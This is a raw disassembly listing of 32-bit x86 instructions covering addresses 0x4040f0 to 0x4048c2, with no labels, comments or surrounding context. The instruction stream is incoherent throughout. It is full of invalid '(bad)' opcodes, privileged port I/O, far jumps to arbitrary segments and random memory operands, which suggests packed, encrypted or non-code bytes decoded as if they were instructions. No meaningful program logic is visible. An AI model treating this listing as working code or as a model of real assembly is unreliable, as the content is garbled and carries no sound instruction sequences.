  4040f0:	jp     0x4040f6
  4040f2:	cmp    al,0xb8
  4040f4:	mov    eax,ds:0xf5ffca31
  4040f9:	das    
  4040fa:	dec    edx
  4040fb:	hlt    
  4040fc:	xchg   edi,eax
  4040fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040fe:	sub    ebp,DWORD PTR [edx]
  404100:	dec    eax
  404101:	jno    0x4040ef
  404103:	inc    ebx
  404104:	(bad)  
  404105:	jns    0x4040a6
  404107:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404108:	jae    0x404116
  40410a:	cli    
  40410b:	(bad)  
  40410c:	rol    BYTE PTR [eax],0xab
  40410f:	xchg   BYTE PTR [edx+0x7d],cl
  404112:	out    dx,al
  404113:	daa    
  404114:	and    DWORD PTR [ebx+0x6a],eax
  404117:	loop   0x404191
  404119:	xchg   ebx,eax
  40411a:	jbe    0x404144
  40411c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40411d:	jae    0x404108
  40411f:	(bad)  
  404120:	add    edx,DWORD PTR [eax+0x6f]
  404123:	pop    esi
  404124:	dec    edi
  404125:	lods   al,BYTE PTR ds:[esi]
  404126:	ds cmp cl,ch
  404129:	mov    DWORD PTR [esi+0x3010dba1],edi
  40412f:	js     0x404165
  404131:	icebp  
  404132:	pop    ebx
  404133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404134:	dec    esp
  404135:	icebp  
  404136:	(bad)  
  404137:	stc    
  404138:	out    dx,al
  404139:	xor    bl,bl
  40413b:	enter  0x98f6,0xb5
  40413f:	popa   
  404140:	or     eax,0xd8490359
  404145:	pop    edi
  404146:	mov    al,ds:0x682a172a
  40414b:	fisub  DWORD PTR [ecx+0x3552aa79]
  404151:	mov    cl,0x69
  404153:	scas   eax,DWORD PTR es:[edi]
  404154:	adc    eax,0x38470f30
  404159:	repz xchg ebx,eax
  40415b:	rol    ah,1
  40415d:	inc    edx
  40415e:	lds    esi,FWORD PTR ds:0xc25cac82
  404164:	pop    edi
  404165:	dec    esp
  404166:	idiv   DWORD PTR [esi]
  404168:	mov    ebx,0xa687d8e1
  40416d:	jg     0x404166
  40416f:	and    al,dh
  404171:	jno    0x4041a4
  404173:	js     0x404169
  404175:	or     al,bl
  404177:	push   0x31
  404179:	icebp  
  40417a:	inc    ebx
  40417b:	push   edi
  40417c:	(bad)  
  404180:	enter  0xe383,0x33
  404184:	test   BYTE PTR [eax],bh
  404186:	pop    eax
  404187:	neg    BYTE PTR [edi]
  404189:	repz xor BYTE PTR [ecx],ah
  40418c:	imul   ecx,DWORD PTR [esi],0x78
  40418f:	iret   
  404190:	loopne 0x404165
  404192:	fiadd  DWORD PTR [eax]
  404194:	push   eax
  404195:	mov    eax,ds:0x92a33cac
  40419a:	test   al,0x15
  40419c:	pushf  
  40419d:	dec    esp
  40419e:	inc    ebx
  40419f:	scas   eax,DWORD PTR es:[edi]
  4041a0:	faddp  st(1),st
  4041a2:	jmp    0x35af3a45
  4041a7:	imul   edi,DWORD PTR [ebx],0xffffff8e
  4041aa:	ret    0xc54c
  4041ad:	xchg   ebx,eax
  4041ae:	cdq    
  4041af:	rcr    DWORD PTR [edi],cl
  4041b1:	add    DWORD PTR [eax+ecx*1+0x5cf18184],ebx
  4041b8:	adc    ah,bl
  4041ba:	lods   eax,DWORD PTR ds:[esi]
  4041bb:	adc    ah,al
  4041bd:	and    eax,0x1106f584
  4041c2:	push   ebx
  4041c3:	scas   al,BYTE PTR es:[edi]
  4041c4:	mov    al,ds:0x162ad555
  4041c9:	or     bh,BYTE PTR [ecx]
  4041cb:	mov    ecx,0x90f4d768
  4041d0:	inc    ecx
  4041d1:	xchg   ebp,eax
  4041d2:	mov    ecx,0x4765b746
  4041d7:	push   ebx
  4041d8:	(bad)
  4041db:	out    dx,eax
  4041dc:	in     al,0xb9
  4041de:	jb     0x40423e
  4041e0:	js     0x4041d7
  4041e2:	sub    al,0xa6
  4041e4:	mov    eax,ds:0x92aa3367
  4041e9:	sbb    cl,bh
  4041eb:	shl    bl,0x1d
  4041ee:	popf   
  4041ef:	xchg   edi,eax
  4041f0:	mov    edx,0x236145d9
  4041f5:	(bad)
  4041f9:	loop   0x4041e7
  4041fb:	mov    ch,0x26
  4041fd:	aam    0xa
  4041ff:	scas   eax,DWORD PTR es:[edi]
  404200:	add    BYTE PTR [eax-0x4d],0xf7
  404204:	aaa    
  404205:	bound  edi,QWORD PTR [ebx-0x7522977d]
  40420b:	bound  esi,QWORD PTR [ebx]
  40420d:	pop    es
  40420e:	cs add eax,0xbb22774
  404214:	arpl   cx,bp
  404216:	xor    BYTE PTR [eax+0x564c0da9],0x44
  40421d:	pushf  
  40421e:	xchg   edx,eax
  40421f:	dec    edx
  404220:	cmp    al,0xe8
  404222:	adc    cl,BYTE PTR [esi-0x7ec33580]
  404228:	and    al,0x6e
  40422a:	xlat   BYTE PTR ds:[ebx]
  40422b:	dec    ebp
  40422c:	sbb    DWORD PTR [edx+0x20a211c6],edx
  404232:	out    0xf4,eax
  404234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404235:	jb     0x40428d
  404237:	push   0xffffffe2
  404239:	push   ecx
  40423a:	ds or  eax,0xae83d561
  404241:	mov    edx,0x1f48166e
  404246:	js     0x4041eb
  404248:	iret   
  404249:	je     0x404242
  40424b:	mov    dh,0xf8
  40424d:	dec    edi
  40424e:	pop    ebp
  40424f:	jmp    0x4042af
  404251:	ja     0x4042c6
  404253:	int3   
  404254:	and    DWORD PTR [ecx+esi*1],edi
  404257:	outs   dx,BYTE PTR ds:[esi]
  404258:	pusha  
  404259:	sub    eax,0x1744d1b2
  40425e:	push   cs
  40425f:	test   DWORD PTR [ebp-0x7a30c929],eax
  404265:	jmp    0x41ec5920
  40426a:	js     0x404226
  40426c:	cmp    al,BYTE PTR [ebx+ebp*2-0x4282a204]
  404273:	rcl    cl,cl
  404275:	(bad)  
  404276:	mov    edi,0x261172ea
  40427b:	iret   
  40427c:	mov    DWORD PTR [eax+0x21],edi
  40427f:	mov    edi,0xd9489790
  404284:	mov    ?,eax
  404286:	js     0x404288
  404288:	mov    DWORD PTR [eax],edi
  40428a:	inc    edi
  40428b:	push   edi
  40428c:	mov    dl,BYTE PTR [edx+eax*4-0x3546d455]
  404293:	pop    esi
  404294:	pop    edi
  404295:	jmp    0x8256b30d
  40429a:	fimul  DWORD PTR [ecx-0x76daa2ed]
  4042a0:	retf   0xd8f5
  4042a3:	pop    ss
  4042a4:	adc    dl,bl
  4042a6:	lea    ecx,[ebx+0x22]
  4042a9:	jnp    0x404296
  4042ab:	cmp    DWORD PTR [esi-0xc1665ea],0x77d97fcd
  4042b5:	cwde   
  4042b6:	ss pop edx
  4042b8:	or     DWORD PTR [edx],edx
  4042ba:	lock (bad) 
  4042bc:	adc    DWORD PTR [ecx],ebx
  4042be:	mov    cl,0xee
  4042c0:	inc    edx
  4042c1:	not    DWORD PTR [ebp-0x4a266648]
  4042c7:	outs   dx,DWORD PTR ds:[esi]
  4042c8:	call   0x57d3:0x36b117c7
  4042cf:	mov    eax,0xf10abd78
  4042d4:	sahf   
  4042d5:	add    cl,BYTE PTR [edi+0x5d]
  4042d8:	in     al,dx
  4042d9:	je     0x40430d
  4042db:	xchg   edx,eax
  4042dc:	daa    
  4042dd:	imul   edx,DWORD PTR [eax],0x6bc91a54
  4042e3:	xor    BYTE PTR [edx],0xbe
  4042e6:	or     DWORD PTR [ebp+ebx*8-0x51b4620a],ebp
  4042ed:	dec    eax
  4042ee:	js     0x40433f
  4042f0:	gs lahf 
  4042f2:	xor    al,0x68
  4042f4:	mov    esp,db3
  4042f7:	call   0x5edf:0x96f4061a
  4042fe:	pop    ecx
  4042ff:	xor    ebx,DWORD PTR [edx-0x4c]
  404302:	sahf   
  404303:	adc    ebx,DWORD PTR [ecx-0x177560f1]
  404309:	out    dx,eax
  40430a:	mov    dh,0x58
  40430c:	cmp    al,0xff
  40430e:	shl    DWORD PTR [eax+esi*2-0x135afa7],0x7a
  404316:	out    0x35,eax
  404318:	loopne 0x404361
  40431a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40431c:	fwait
  40431d:	cli    
  40431e:	mul    ecx
  404320:	rol    DWORD PTR [edx],0xc1
  404323:	and    BYTE PTR ds:0x736158c1,cl
  404329:	or     ebx,DWORD PTR [edx+0x489af24c]
  40432f:	push   ss
  404330:	push   0xffffffd5
  404332:	xchg   ecx,eax
  404333:	cmp    ebp,esp
  404335:	or     bl,BYTE PTR [ebp-0x62]
  404338:	pop    ss
  404339:	push   cs
  40433a:	xor    ecx,edi
  40433c:	adc    eax,0xa47ca53
  404341:	icebp  
  404342:	ins    DWORD PTR es:[edi],dx
  404343:	das    
  404344:	jne    0x40439d
  404346:	mov    cs:0x2b7f03,al
  40434c:	cld    
  40434d:	ret    
  40434e:	adc    bl,BYTE PTR [esi+ebx*1]
  404351:	fisubr WORD PTR [esi]
  404353:	loopne 0x4042f6
  404355:	mov    edi,0x39904738
  40435a:	xchg   DWORD PTR [ebp-0x1b],esi
  40435d:	pop    ecx
  40435e:	pop    ss
  40435f:	pop    ebp
  404360:	jno    0x40431f
  404362:	cs jmp 0x81f062dc
  404368:	cmp    DWORD PTR [edi-0x47],esp
  40436b:	lea    eax,[ebx-0x9367b18]
  404371:	ins    BYTE PTR es:[edi],dx
  404372:	es adc eax,0x53d02446
  404378:	sbb    eax,0x8e225500
  40437d:	ret    0x293e
  404380:	and    al,0x85
  404382:	and    ebp,DWORD PTR [eax-0x67]
  404385:	stos   BYTE PTR es:[edi],al
  404386:	jae    0x404339
  404388:	in     eax,dx
  404389:	xor    bh,BYTE PTR [eax]
  40438b:	xor    BYTE PTR [ebp+edx*8+0x779ec27f],bh
  404392:	adc    eax,DWORD PTR [ebx+0x7abd7663]
  404398:	mov    edi,0x704b0bd0
  40439d:	pop    ebx
  40439e:	outs   dx,DWORD PTR ds:[esi]
  40439f:	jmp    0x29d86d38
  4043a4:	cwde   
  4043a5:	je     0x40439d
  4043a7:	xor    edx,DWORD PTR [ebp-0x5ab22e27]
  4043ad:	mov    ebp,DWORD PTR [edx+0x14]
  4043b0:	idiv   BYTE PTR [edx]
  4043b2:	add    BYTE PTR [esi+esi*2],ah
  4043b5:	push   ebx
  4043b6:	or     bh,BYTE PTR [edx+0x35]
  4043b9:	aaa    
  4043ba:	mov    cl,0xdb
  4043bc:	cmp    ch,BYTE PTR [edx+0x7851732a]
  4043c2:	retf   
  4043c3:	cmp    eax,0xb1ec74ed
  4043c8:	in     eax,dx
  4043c9:	retf   0x1ca5
  4043cc:	(bad)  
  4043cd:	scas   eax,DWORD PTR es:[edi]
  4043ce:	xchg   ebp,eax
  4043cf:	in     al,dx
  4043d0:	dec    edi
  4043d1:	ret    
  4043d2:	hlt    
  4043d3:	bound  eax,QWORD PTR [ecx]
  4043d5:	call   0x6fe53234
  4043da:	ss cdq 
  4043dc:	ins    BYTE PTR es:[edi],dx
  4043dd:	add    ah,0xfe
  4043e0:	sub    DWORD PTR [ecx],esi
  4043e2:	in     eax,0x61
  4043e4:	(bad)  
  4043e5:	sub    eax,DWORD PTR [ebx+0x5b]
  4043e8:	ins    DWORD PTR es:[edi],dx
  4043e9:	xor    esi,ecx
  4043eb:	jecxz  0x40442e
  4043ed:	or     BYTE PTR [esi-0x8134bd4],0x41
  4043f4:	push   ds
  4043f5:	dec    edx
  4043f6:	fadd   QWORD PTR [ecx+0x230ef81]
  4043fc:	mov    al,BYTE PTR [esi+edx*2+0x44]
  404400:	xor    al,0x95
  404402:	xor    DWORD PTR [edx-0x311f1dd5],eax
  404408:	dec    ebx
  404409:	push   ds
  40440a:	out    dx,al
  40440b:	ds xchg edx,eax
  40440d:	mov    BYTE PTR [edi-0x16d2c6d1],ah
  404413:	loop   0x404396
  404415:	add    BYTE PTR [ecx],cl
  404417:	adc    DWORD PTR [ebp+eax*8-0x2a],edx
  40441b:	ds fwait
  40441d:	jo     0x404489
  40441f:	rol    BYTE PTR [edx+esi*1+0x54],cl
  404423:	jb     0x404499
  404425:	jle    0x4043c4
  404427:	nop
  404428:	cs mov eax,0xc8f469b2
  40442e:	stos   DWORD PTR es:[edi],eax
  40442f:	xchg   ecx,ebp
  404431:	sub    ebx,DWORD PTR [edx+ebp*2-0x1d524645]
  404438:	lahf   
  404439:	mov    ds:0xf131336b,eax
  40443e:	mov    dh,0x20
  404440:	pushaw 
  404442:	sub    dh,BYTE PTR [esi-0x398b27e3]
  404448:	fsub   QWORD PTR [ebx-0x6c]
  40444b:	lods   al,BYTE PTR ds:[esi]
  40444c:	sbb    DWORD PTR [ecx+eax*8-0x25dc6c1e],esi
  404453:	(bad)  
  404454:	xchg   edx,eax
  404455:	sub    al,0x10
  404457:	ja     0x4043f4
  404459:	add    eax,0x63f43ee5
  40445e:	and    DWORD PTR [esi],0xf66f79ac
  404464:	loop   0x40445e
  404466:	cwde   
  404467:	xor    BYTE PTR [ebp-0x3b275930],ch
  40446d:	sbb    eax,0x4e32d4a5
  404472:	mov    eax,ds:0x85d315d6
  404477:	jnp    0x40445e
  404479:	cmp    eax,0x70acfb96
  40447e:	or     DWORD PTR [eax-0x3b8f0d40],ebp
  404484:	mov    ebp,0xd9d54a18
  404489:	int3   
  40448a:	add    DWORD PTR [eax],esi
  40448c:	loope  0x40442e
  40448e:	ss inc esi
  404490:	adc    bl,dh
  404492:	fdivr  DWORD PTR [edx]
  404494:	xor    al,0x25
  404496:	call   0xfcd7:0x879c1d93
  40449d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40449e:	scas   al,BYTE PTR es:[edi]
  40449f:	(bad)  
  4044a0:	call   DWORD PTR [ebp-0x6a]
  4044a3:	mov    ds:0x8d38c5f2,al
  4044a8:	and    DWORD PTR [ebx+0x53b133fd],ecx
  4044ae:	ins    DWORD PTR es:[edi],dx
  4044af:	cdq    
  4044b0:	xor    BYTE PTR [edi],ch
  4044b2:	sub    DWORD PTR [edi+0x66f76e52],edi
  4044b8:	and    esi,DWORD PTR [esi+0xc]
  4044bb:	push   ds
  4044bc:	jg     0x404486
  4044be:	push   edi
  4044bf:	jbe    0x404449
  4044c1:	cmc    
  4044c2:	cli    
  4044c3:	ret    
  4044c4:	add    DWORD PTR [ebx],ebp
  4044c6:	call   0x99226a64
  4044cb:	pop    ebx
  4044cc:	dec    ecx
  4044cd:	repz (bad) 
  4044d0:	retf   
  4044d1:	dec    esi
  4044d2:	xchg   ebx,eax
  4044d3:	call   0xc7:0x5b7479c9
  4044da:	iret   
  4044db:	push   ebp
  4044dc:	jg     0x4044e6
  4044de:	(bad)  
  4044df:	sahf   
  4044e0:	jecxz  0x404475
  4044e2:	jmp    0x404539
  4044e4:	or     al,0x2f
  4044e6:	inc    ebx
  4044e7:	mov    ebp,0x5dc2c790
  4044ec:	ins    DWORD PTR es:[edi],dx
  4044ed:	push   ecx
  4044ee:	jg     0x4044cd
  4044f0:	shl    BYTE PTR [ecx-0x2b],1
  4044f3:	and    bl,al
  4044f5:	mov    bl,0xeb
  4044f7:	lods   al,BYTE PTR ds:[esi]
  4044f8:	lahf   
  4044f9:	(bad)  
  4044fb:	inc    eax
  4044fc:	jbe    0x40454e
  4044fe:	pop    edx
  4044ff:	and    al,0x9b
  404501:	sub    al,0xe5
  404503:	mov    edx,0x23101379
  404508:	imul   esp,DWORD PTR ds:0x5be29db7,0x7e
  40450f:	dec    ebp
  404510:	sub    BYTE PTR [edx],ch
  404512:	cdq    
  404513:	outs   dx,BYTE PTR ds:[esi]
  404514:	cmp    BYTE PTR [ebx],bh
  404516:	mov    eax,0xcd1f86a6
  40451b:	dec    ebx
  40451c:	mov    dh,0x36
  40451e:	(bad)  
  40451f:	cmp    ch,ch
  404521:	stc    
  404522:	cmp    DWORD PTR [ecx-0x77],edx
  404525:	mov    edi,0x800b551
  40452a:	mov    ds:0x1efbe00a,al
  40452f:	fcom   QWORD PTR [esi+0x292f1f99]
  404535:	and    eax,0x68ebe065
  40453a:	xchg   esi,edi
  40453c:	in     eax,dx
  40453d:	push   cs
  40453e:	xchg   DWORD PTR [ebp+esi*8+0x40],ebx
  404542:	jb     0x4044f3
  404544:	lahf   
  404545:	pop    ecx
  404546:	ret    
  404547:	rcl    bh,cl
  404549:	sub    al,0x2d
  40454b:	mov    DWORD PTR [ebx+ecx*1-0x1c],ebx
  40454f:	or     DWORD PTR [esi-0x4bf6cc42],edx
  404555:	sbb    BYTE PTR [esi+0x3e548054],0x51
  40455c:	adc    DWORD PTR ds:0x4291cf47,ebx
  404562:	xchg   DWORD PTR [ecx+eax*4],edi
  404565:	out    0x5f,eax
  404567:	or     BYTE PTR [edi+0x1e],bl
  40456a:	stos   DWORD PTR es:[edi],eax
  40456b:	adc    DWORD PTR [ecx+0x21],ecx
  40456e:	in     al,dx
  40456f:	adc    ecx,eax
  404571:	sbb    edi,DWORD PTR [ecx-0xe]
  404574:	inc    esp
  404575:	mov    edi,0x3b2db596
  40457a:	mov    ebp,0x580837cc
  40457f:	enter  0xcd41,0x64
  404583:	mov    ah,0x71
  404585:	dec    esp
  404586:	jmp    0x59d6:0x65f17328
  40458d:	push   cs
  40458e:	mov    bh,0x1c
  404590:	xor    esp,esi
  404592:	xor    eax,0x8ca87c7
  404597:	imul   ebp,DWORD PTR [ecx+0x6ccc5b65],0x4568d3bc
  4045a1:	fcmovne st,st(1)
  4045a3:	or     eax,0xe43bc2aa
  4045a8:	aad    0x3b
  4045aa:	sbb    ecx,DWORD PTR [edi-0xf]
  4045ad:	int    0x3c
  4045af:	add    eax,0x1cee6080
  4045b4:	add    cl,ah
  4045b6:	mov    bl,0x2
  4045b8:	pop    edi
  4045b9:	cmp    al,ah
  4045bb:	mov    BYTE PTR [eax+0x35254d2c],cl
  4045c1:	mov    dl,0x8
  4045c3:	push   ds
  4045c4:	ror    DWORD PTR [edi+0x794e3549],cl
  4045ca:	jns    0x40458c
  4045cc:	xchg   ch,bl
  4045ce:	in     eax,dx
  4045cf:	xchg   esi,eax
  4045d0:	ins    DWORD PTR es:[edi],dx
  4045d1:	aad    0xa2
  4045d3:	mov    eax,ds:0x3e17037f
  4045d8:	fsub   DWORD PTR [ecx+ebx*2-0x6e56cd9]
  4045df:	std    
  4045e0:	mov    BYTE PTR [edx+0x15ecf5cc],ch
  4045e6:	jle    0x404573
  4045e8:	stos   BYTE PTR es:[edi],al
  4045e9:	cmc    
  4045ea:	xchg   edx,ecx
  4045ec:	jp     0x4045c0
  4045ee:	mov    BYTE PTR [esi],0xac
  4045f1:	mov    ch,BYTE PTR [edx+0x49]
  4045f4:	lahf   
  4045f5:	inc    edi
  4045f6:	pop    ss
  4045f7:	in     eax,0x31
  4045f9:	shr    DWORD PTR [ecx],1
  4045fb:	cmp    DWORD PTR [ecx+0x72980553],ecx
  404601:	push   ebp
  404602:	cli    
  404603:	lahf   
  404604:	in     eax,0x16
  404606:	inc    esp
  404607:	adc    BYTE PTR [ebx],0x78
  40460a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40460b:	jb     0x4045e6
  40460d:	sbb    ecx,DWORD PTR [edi+0x55dbd69f]
  404613:	dec    bx
  404615:	sub    DWORD PTR [edi+eiz*1+0x28],ebp
  404619:	cmc    
  40461a:	jno    0x4045fb
  40461c:	or     edi,edi
  40461e:	pop    edx
  40461f:	mov    ch,0x35
  404621:	lds    ecx,FWORD PTR [ebx+0x6a]
  404624:	pop    ebp
  404625:	or     BYTE PTR [esp+ebx*1-0x74],0x36
  40462a:	test   DWORD PTR [edi+edx*8+0x3e],ebp
  40462e:	push   ss
  40462f:	push   edi
  404630:	(bad)  
  404631:	jmp    0x243e:0x5537a308
  404638:	jo     0x404647
  40463a:	jae    0x4045c0
  40463c:	adc    eax,0x1c4c21b
  404641:	in     eax,0x84
  404643:	mov    bl,0xfe
  404645:	xchg   BYTE PTR [edi],ch
  404647:	std    
  404648:	popf   
  404649:	sub    al,0x99
  40464b:	mov    ecx,0x377c12a9
  404650:	sbb    dh,bh
  404652:	adc    eax,0x59b09b15
  404657:	push   0x47
  404659:	retf   0xe7cd
  40465c:	mov    ah,0x3d
  40465e:	xor    esi,ecx
  404660:	pop    edi
  404661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404662:	sbb    BYTE PTR [eax],bl
  404664:	shr    DWORD PTR [ebx-0x1f],0xcf
  404668:	mov    bl,0x35
  40466a:	aad    0x47
  40466c:	inc    ecx
  40466d:	mov    al,0xcb
  40466f:	fs xchg ebx,eax
  404671:	inc    edi
  404672:	inc    eax
  404673:	scas   al,BYTE PTR es:[edi]
  404674:	stos   BYTE PTR es:[edi],al
  404675:	sbb    eax,0xb5b861b8
  40467a:	loop   0x40460c
  40467c:	dec    esi
  40467d:	test   DWORD PTR ds:0xf84d077e,ecx
  404683:	sbb    cl,ah
  404685:	xchg   ch,bh
  404687:	popf   
  404688:	add    ebp,DWORD PTR ds:0x30077dc8
  40468e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40468f:	xchg   ecx,eax
  404690:	scas   al,BYTE PTR es:[edi]
  404691:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404692:	mov    al,0xbb
  404694:	out    0xfa,al
  404696:	mov    ebp,0x55a2da56
  40469b:	(bad)  
  40469c:	test   eax,0xd7301a24
  4046a1:	sub    bl,BYTE PTR [esi+ecx*2]
  4046a4:	mul    BYTE PTR [ebp+0x5f]
  4046a7:	push   ebx
  4046a8:	sbb    cl,ah
  4046aa:	call   0xb7b1555f
  4046af:	imul   BYTE PTR [esi+0x6a5ff060]
  4046b5:	(bad)  
  4046b6:	jmp    0x5e1320fb
  4046bb:	arpl   bx,dx
  4046bd:	ret    0x7c98
  4046c0:	mov    eax,ds:0x7806c545
  4046c5:	mov    esi,0x12eb61c2
  4046ca:	cmp    al,0xe3
  4046cc:	out    dx,al
  4046cd:	push   ecx
  4046ce:	mov    ah,0x9f
  4046d0:	(bad)  
  4046d1:	push   0x77
  4046d3:	dec    edi
  4046d4:	jo     0x4046c0
  4046d6:	xor    BYTE PTR [esi],0x3f
  4046d9:	loopne 0x4046c8
  4046db:	sbb    bh,BYTE PTR [edx]
  4046dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046de:	mov    dh,0x36
  4046e0:	cmp    DWORD PTR [eax-0x32aabd9],ebx
  4046e6:	sahf   
  4046e7:	xchg   ebp,eax
  4046e8:	pop    ebx
  4046e9:	jb     0x4046b9
  4046eb:	mov    WORD PTR [eax-0x49],?
  4046ee:	push   cs
  4046ef:	hlt    
  4046f0:	lods   al,BYTE PTR ds:[esi]
  4046f1:	fdivr  QWORD PTR [ebp+0x54d76901]
  4046f7:	retf   0xa4f0
  4046fa:	xchg   DWORD PTR [edx+ebx*2],edi
  4046fd:	lods   eax,DWORD PTR ds:[esi]
  4046fe:	loop   0x4046f5
  404700:	scas   eax,DWORD PTR es:[edi]
  404701:	loope  0x404731
  404703:	pusha  
  404704:	imul   ebp,DWORD PTR [esi+0x48],0x2e38174
  40470b:	es fdivr st,st(0)
  40470e:	mov    ebx,0xd433945b
  404713:	lds    edx,FWORD PTR [ebx]
  404715:	fs (bad) 
  404717:	sbb    ecx,DWORD PTR [esp+edi*1-0x36673961]
  40471e:	call   0xa6ff4fd4
  404723:	push   ds
  404724:	and    eax,esp
  404726:	or     eax,0xaf2b0fe1
  40472b:	sub    al,0x10
  40472d:	cld    
  40472e:	xchg   ebx,eax
  40472f:	mov    ds:0x3545903,al
  404734:	lahf   
  404735:	mov    ds:0x8cf32946,al
  40473a:	loope  0x404702
  40473c:	xchg   edi,eax
  40473d:	lods   eax,DWORD PTR fs:[esi]
  40473f:	sbb    ecx,eax
  404741:	cmp    BYTE PTR [edx-0x5445e8c5],ah
  404747:	mov    ebp,0x627c8f16
  40474c:	fisubr WORD PTR [esi+0x6e]
  40474f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404750:	(bad)  
  404751:	out    dx,eax
  404752:	and    dh,BYTE PTR [edi]
  404754:	mov    edx,0x7b94ef45
  404759:	stc    
  40475a:	pop    ecx
  40475b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40475c:	jae    0x404780
  40475e:	mov    edx,0x7e02750f
  404763:	pop    esi
  404764:	mov    al,0x54
  404766:	dec    edi
  404767:	ss dec ebx
  404769:	inc    ebx
  40476a:	mov    ebp,0x5ca87f89
  40476f:	add    eax,0x66d0d7e4
  404774:	xchg   DWORD PTR [ebx-0x43],esp
  404777:	and    ebp,DWORD PTR [edx+0x3f392849]
  40477d:	test   DWORD PTR [edx+0x63b985aa],edi
  404783:	ss jnp 0x40474f
  404786:	ins    DWORD PTR es:[edi],dx
  404787:	sar    esi,1
  404789:	daa    
  40478a:	loop   0x4047ee
  40478c:	out    dx,al
  40478d:	cs js  0x404721
  404790:	jl     0x4047b8
  404792:	inc    ebp
  404793:	mov    dl,0x9a
  404795:	cmp    esi,ebp
  404797:	add    dl,bl
  404799:	lea    ecx,ds:0xf2d77823
  40479f:	aam    0x71
  4047a1:	rcr    DWORD PTR [edi+eiz*8+0x448dc0b1],cl
  4047a8:	cmc    
  4047a9:	mov    ds:0x668fb6f8,eax
  4047ae:	fbld   TBYTE PTR [ecx-0x644e2d6]
  4047b4:	xor    esp,edx
  4047b6:	dec    ebp
  4047b7:	push   edi
  4047b8:	and    eax,0x421b3f6b
  4047bd:	sbb    DWORD PTR [esi],0x1e
  4047c0:	mov    ah,0xea
  4047c2:	mov    ds,WORD PTR [edx]
  4047c4:	push   ebx
  4047c5:	jno    0x404756
  4047c7:	int    0x7c
  4047c9:	mov    BYTE PTR [esp+esi*2],dl
  4047cc:	dec    esi
  4047cd:	(bad)  
  4047cf:	mov    ebx,0x9657c2a7
  4047d4:	sub    al,0x4
  4047d6:	mov    edi,0xaa86352d
  4047db:	add    DWORD PTR [ebx-0x5def7cb5],0x4d3bdab2
  4047e5:	pusha  
  4047e6:	push   ecx
  4047e7:	add    al,0xd2
  4047e9:	icebp  
  4047ea:	(bad)  [esi+0x27]
  4047ed:	adc    DWORD PTR [edi],ebp
  4047ef:	leave  
  4047f0:	sbb    DWORD PTR [ecx-0x42],edi
  4047f3:	or     dh,BYTE PTR [esi]
  4047f5:	push   ebx
  4047f6:	pushf  
  4047f7:	cmp    DWORD PTR ss:[di],ecx
  4047fb:	ror    BYTE PTR [edi-0x6f67878b],cl
  404801:	cmp    eax,edx
  404803:	daa    
  404804:	push   0xffffffb5
  404806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404807:	pop    eax
  404808:	push   esp
  404809:	push   ecx
  40480a:	punpckldq mm0,DWORD PTR [edx-0x5935b8f4]
  404811:	inc    esp
  404812:	stos   BYTE PTR es:[edi],al
  404813:	pop    ebp
  404814:	fdiv   QWORD PTR [edi]
  404816:	xchg   DWORD PTR [eax],ecx
  404818:	mov    cl,cl
  40481a:	jmp    0x4047c6
  40481c:	cmp    ecx,DWORD PTR [edi]
  40481e:	fmul   DWORD PTR [edi]
  404820:	dec    esp
  404821:	enter  0xe2b9,0xa2
  404825:	or     al,0x83
  404827:	dec    ebp
  404828:	leave  
  404829:	retf   
  40482a:	scas   eax,DWORD PTR es:[edi]
  40482b:	push   0xa873579d
  404830:	sub    ah,cl
  404832:	repz sub bl,BYTE PTR [esi]
  404835:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404836:	test   BYTE PTR [eax-0x39],bl
  404839:	mov    bh,0xb9
  40483b:	jle    0x4047e7
  40483d:	dec    ecx
  40483e:	xchg   DWORD PTR [esi],ebp
  404840:	mov    al,0x1f
  404842:	ds js  0x4047dc
  404845:	in     al,0x64
  404847:	cmp    al,0x17
  404849:	xor    DWORD PTR [ecx],esi
  40484b:	dec    ebx
  40484c:	test   DWORD PTR [eax-0x778eaba8],ebx
  404852:	dec    esi
  404853:	aaa    
  404854:	add    BYTE PTR [edx-0x7e141ad1],bl
  40485a:	add    ah,ch
  40485c:	adc    BYTE PTR [edx],ah
  40485e:	add    eax,0x961f8c3b
  404863:	mov    esi,0xdc4ce6c
  404868:	mov    ds:0xc6c911a9,al
  40486d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40486e:	shl    DWORD PTR fs:[ebx+edi*1],1
  404872:	test   DWORD PTR [edi+ebp*8-0x65],ebp
  404876:	and    al,0xd0
  404878:	push   eax
  404879:	pop    edi
  40487a:	lea    edi,[eax+0x18]
  40487d:	add    al,0x4f
  40487f:	pop    ds
  404880:	add    DWORD PTR [eax-0x46],eax
  404883:	pop    edi
  404884:	outs   dx,BYTE PTR ds:[esi]
  404885:	ret    
  404886:	xor    BYTE PTR [edi+0x8],ch
  404889:	dec    eax
  40488a:	jecxz  0x4048a3
  40488c:	gs scas eax,DWORD PTR es:[edi]
  40488e:	inc    ebx
  40488f:	in     al,0xce
  404891:	mov    DWORD PTR [esp+edx*4+0x2],esp
  404895:	xchg   esi,eax
  404896:	adc    al,ah
  404898:	sbb    ecx,ebx
  40489a:	pusha  
  40489b:	out    0x70,al
  40489d:	jmp    0xb677:0x2494d3ad
  4048a4:	jmp    0x425c:0xcd70e85c
  4048ab:	jno    0x404888
  4048ad:	add    ah,BYTE PTR [esi+0x3c]
  4048b0:	test   al,0x84
  4048b2:	ins    BYTE PTR es:[edi],dx
  4048b3:	adc    BYTE PTR [esi-0x1b],cl
  4048b6:	out    dx,al
  4048b7:	xchg   BYTE PTR [edi+0x598b3565],dh
  4048bd:	shl    DWORD PTR [ebx],1
  4048bf:	xchg   esp,eax
  4048c0:	sti    
  4048c1:	push   cs
  4048c2:	mov    al,0xfe
